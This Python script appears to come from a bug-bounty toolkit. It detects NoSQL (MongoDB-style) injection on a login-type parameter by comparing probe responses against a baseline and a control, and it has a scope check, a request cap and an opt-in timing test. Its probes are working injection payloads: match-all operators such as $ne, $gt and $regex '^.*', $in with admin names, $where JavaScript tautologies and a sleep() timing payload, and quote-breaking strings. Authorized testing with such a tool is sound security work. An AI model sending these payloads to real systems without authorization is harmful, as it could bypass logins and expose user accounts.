#!/usr/bin/env python3
"""Differential NoSQL (MongoDB-style) operator and syntax injection detection.

No data is extracted. Each probe is compared with a baseline (random value that
should match nothing) and with a control (an operator that can never match).
An operator is only reported when it changes the response AND the control does not.

Operator and syntax tests are sent to your own test account or to a field you
are authorized to test. Timing probes need --allow-timing and are capped.
Scope gate runs first.

Example:
  nosql_probe.py --target example.com --workspace ~/Documents/bugbounty \
     --url https://example.com/api/login --param username --json-body \
     --other password=TestPass123 --out artifacts/example.com/nosql.json
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import secrets
import ssl
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

REPO = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "..", ".."))
SCOPE = os.path.join(REPO, "scripts", "scope_check.sh")
MAX_REQUESTS = 30
ERROR_SIGS = ["mongoerror", "bsonerror", "bson", "unterminated string", "syntaxerror", "cast to", "castError",
              "$where", "invalid operator", "unknown operator", "mongoose", "pymongo", "couchdb", "cassandra"]


def build_body(field: str, value, as_json: bool, others: dict[str, str]) -> tuple[bytes, str]:
    """Return (body, content-type). Operators are sent as a dict (JSON) or as bracket keys (form)."""
    if as_json:
        data = {field: value}
        data.update(others)
        return json.dumps(data).encode(), "application/json"
    pairs: list[tuple[str, str]] = []
    if isinstance(value, dict):
        for op, arg in value.items():
            pairs.append((f"{field}[{op}]", str(arg)))
    else:
        pairs.append((field, str(value)))
    pairs.extend(others.items())
    return urllib.parse.urlencode(pairs).encode(), "application/x-www-form-urlencoded"


def send(url: str, method: str, field: str, value, as_json: bool, others: dict[str, str],
         headers: dict[str, str], timeout: float) -> tuple[int, str, float]:
    body, ctype = build_body(field, value, as_json, others)
    req = urllib.request.Request(url, data=body if method == "POST" else None, method=method,
                                 headers={"Content-Type": ctype, **headers})
    start = time.monotonic()
    ctx = ssl.create_default_context()
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            return resp.status, resp.read(200_000).decode("utf-8", "replace"), time.monotonic() - start
    except urllib.error.HTTPError as err:
        return err.code, err.read(200_000).decode("utf-8", "replace"), time.monotonic() - start
    except (urllib.error.URLError, TimeoutError) as err:
        return 0, str(err), time.monotonic() - start


def fingerprint(status: int, body: str) -> dict:
    return {"status": status, "length": len(body), "sha": hashlib.sha256(body.encode()).hexdigest()[:16]}


def differs(a: dict, b: dict) -> bool:
    if a["status"] != b["status"]:
        return True
    if a["length"] and abs(a["length"] - b["length"]) / max(a["length"], 1) > 0.10:
        return True
    return a["sha"] != b["sha"]


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", required=True)
    ap.add_argument("--workspace")
    ap.add_argument("--url", required=True)
    ap.add_argument("--param", required=True, help="field to test, for example username")
    ap.add_argument("--method", choices=["GET", "POST"], default="POST")
    ap.add_argument("--json-body", action="store_true", help="send operators as JSON objects")
    ap.add_argument("--other", action="append", default=[], help="other field as name=value (for example password=...)")
    ap.add_argument("--header", action="append", default=[])
    ap.add_argument("--delay", type=float, default=1.0)
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--allow-timing", action="store_true")
    ap.add_argument("--sleep", type=int, default=3, help="seconds for timing probe (1 to 5)")
    ap.add_argument("--out")
    args = ap.parse_args()

    if args.sleep < 1 or args.sleep > 5:
        ap.error("--sleep must be 1 to 5")

    res = subprocess.run([SCOPE, args.target] + ([args.workspace] if args.workspace else []),
                         capture_output=True, text=True)
    if res.returncode != 0:
        sys.stderr.write(res.stderr or "scope check failed\n")
        return res.returncode

    others = {}
    for o in args.other:
        if "=" in o:
            k, v = o.split("=", 1)
            others[k] = v
    headers = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    rnd = "nq" + secrets.token_hex(4)
    sent = 0
    results = []

    def run(label: str, value, technique: str, as_json: bool = args.json_body):
        nonlocal sent
        status, body, t = send(args.url, args.method, args.param, value, as_json, others, headers, args.timeout)
        sent += 1
        fp = fingerprint(status, body)
        err = any(s in body.lower() for s in ERROR_SIGS)
        time.sleep(args.delay)
        results.append({"probe": label, "technique": technique, "value": value,
                        "fingerprint": fp, "elapsed": round(t, 2), "error_signature": err})
        return fp, t

    baseline, _ = run("baseline (random value)", rnd, "baseline")
    control, _ = run("control ($eq impossible value)", {"$eq": rnd + "-never"}, "control")
    control_matches_baseline = not differs(control, baseline)

    syntax_tests = [
        ("syntax: single quote", "'", "syntax"),
        ("syntax: false condition", "' && 0 && 'x", "syntax-boolean"),
        ("syntax: true condition", "' && 1 && 'x", "syntax-boolean"),
        ("syntax: special characters", "'\"{;$Foo}$Foo \\xYZ", "syntax"),
    ]
    for label, value, tech in syntax_tests:
        if sent >= MAX_REQUESTS:
            break
        run(label, value, tech, as_json=False)

    operator_tests = [
        ("operator $ne (non-matching value)", {"$ne": rnd}, "operator-match-all"),
        ("operator $gt empty string", {"$gt": ""}, "operator-match-all"),
        ("operator $exists true", {"$exists": True}, "operator-match-all"),
        ("operator $regex any", {"$regex": "^.*"}, "operator-regex"),
        ("operator $regex impossible", {"$regex": "^" + rnd + "-never"}, "operator-regex-control"),
        ("operator $in with common names", {"$in": ["admin", "root", "administrator"]}, "operator-in"),
        ("operator $nin with random", {"$nin": [rnd]}, "operator-match-all"),
    ]
    operator_hits = []
    for label, value, tech in operator_tests:
        if sent >= MAX_REQUESTS:
            break
        fp, _ = run(label, value, tech)
        if differs(fp, baseline) and control_matches_baseline:
            operator_hits.append(label)

    if sent < MAX_REQUESTS:
        run("where: tautology", {"$where": "1 == 1"}, "js-where")
        run("where: contradiction", {"$where": "1 == 0"}, "js-where-control")

    if args.allow_timing and sent < MAX_REQUESTS:
        sleep_js = f"sleep({args.sleep * 1000}) || true"
        fp, t = run("where: sleep (timing)", {"$where": sleep_js}, "js-where-timing")
        results[-1]["note"] = "candidate only: repeat and compare with the control" if t >= args.sleep else ""

    if sent < MAX_REQUESTS:
        run("type confusion: number", 1, "type-confusion", as_json=True)

    operator_indicated = bool(operator_hits) and control_matches_baseline
    report = {
        "target": args.target, "url": args.url, "param": args.param, "json_body": args.json_body,
        "requests_sent": sent,
        "control_matches_baseline": control_matches_baseline,
        "operator_hits": operator_hits,
        "verdict": "operator-injection-indicated" if operator_indicated else
                   ("syntax-error-signature" if any(r["error_signature"] for r in results) else "not-indicated"),
        "results": results,
        "next_step": "Confirm with a second, different operator pair on your own account. Do not extract data, "
                     "write data, or run server-side JavaScript beyond the tautology and timing checks.",
    }
    text = json.dumps(report, indent=2)
    if args.out:
        with open(args.out, "w", encoding="utf-8") as fh:
            fh.write(text + "\n")
    print(text)
    return 0


if __name__ == "__main__":
    sys.exit(main())
